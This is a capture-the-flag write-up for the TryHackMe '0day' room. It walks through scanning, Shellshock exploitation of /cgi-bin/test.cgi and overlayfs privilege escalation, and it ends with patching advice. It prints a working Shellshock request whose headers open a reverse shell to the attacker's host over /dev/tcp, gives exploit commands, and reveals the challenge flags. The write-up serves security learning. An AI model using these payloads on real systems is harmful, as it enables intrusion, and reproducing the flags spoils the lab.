# TryHackMe: 0day

## Challenge Description

Exploit Ubuntu, like a Turtle in a Hurricane

Root my secure Website, take a step into the history of hacking.

## Planning and Scoping

Our local machine (the Host) has the IP address: `10.10.80.192`. The remote machine we are targeting is at IP address: `10.10.246.157`.

## Information Gathering and Reconnaissance

We began our investigation by using `nmap` to perform a network scan, identifying open ports and the services running on the target:

```bash
nmap -sC -sV 10.10.246.157
```

Results showed the following open ports and services:

- 22/tcp: OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
- 80/tcp: Apache httpd 2.4.7

Next we can use nikto, a vulnerability scanner, to see possible vulnerabilities

```bash
nikto -h 10.10.246.157
```

The scan detected the following potential vulnerability:

- OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability.

## Threat Modeling

The potential risks and vulnerabilities in the web application's architecture were determined at this stage. The primary threat identified was the Shellshock vulnerability, a serious flaw that can allow an attacker to execute commands remotely, posing a significant risk to the system's security.

## Vulnerability Assessment

Based on the information gathered during the reconnaissance phase, we identified the Shellshock vulnerability in the web application, specifically in the `/cgi-bin/test.cgi` script. This vulnerability allows an attacker to remotely execute arbitrary commands via specific environment variables.

## Exploitation

We exploited the Shellshock vulnerability using a script from Exploit-DB. The script initiates a reverse shell that connects back to our host machine. This connection was facilitated by specially crafted HTTP headers `Referer` and `Cookie` that took advantage of the Shellshock vulnerability. The exploitation was successful and provided us with a shell on the target machine as the `www-data` user, a step toward gaining full control over the target system.

Here is the exploitation script we used, available on Exploit-DB: https://www.exploit-db.com/exploits/34900

```bash
python2.7 exploit.py payload=reverse rhost=10.10.246.157 lhost=10.10.80.192 lport=4444
```

The exploitation resulted in the establishment of a shell as the `www-data` user on the target system. The following HTTP GET request was used:

```http
GET /cgi-bin/test.cgi HTTP/1.1
Host: 10.10.246.157
Accept-Encoding: identity
Referer: () { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.80.192/4444 0>&1 &
Cookie: () { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.80.192/4444 0>&1 &
```


This allowed us to retrieve the first flag:


```bash
cat /home/ryan/user.txt
THM{Sh3llSh0ck_r0ckz}
```


For the second flag, we exploited a Local Privilege Escalation vulnerability named 'overlayfs': https://www.exploit-db.com/exploits/37292

```bash
$ export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
$ gcc ofs.c -o ofs
$ ./ofs
# cat /root/root.txt
THM{g00d_j0b_0day_is_Pleased}
```


## Recommendations

1. Update the system software: The server is running outdated versions of software, including OpenSSH and Apache httpd, which may contain vulnerabilities. Regularly updating these services to their latest stable versions can help to mitigate these vulnerabilities.
2. Patch the Shellshock vulnerability: It is recommended to patch this vulnerability immediately. Patches for this bug have been available since it was discovered. A system update should resolve this issue.
3. Implement Input validation: Consider implementing input validation in any scripts used in the web application to prevent the execution of arbitrary commands.
4. Apply Principle of Least Privilege (PoLP): Services should run with the least amount of privilege necessary to perform their tasks. In this case, the user `www-data` has more permissions than are necessary for running the web application. Reducing these privileges can help limit the potential damage caused by a successful exploit.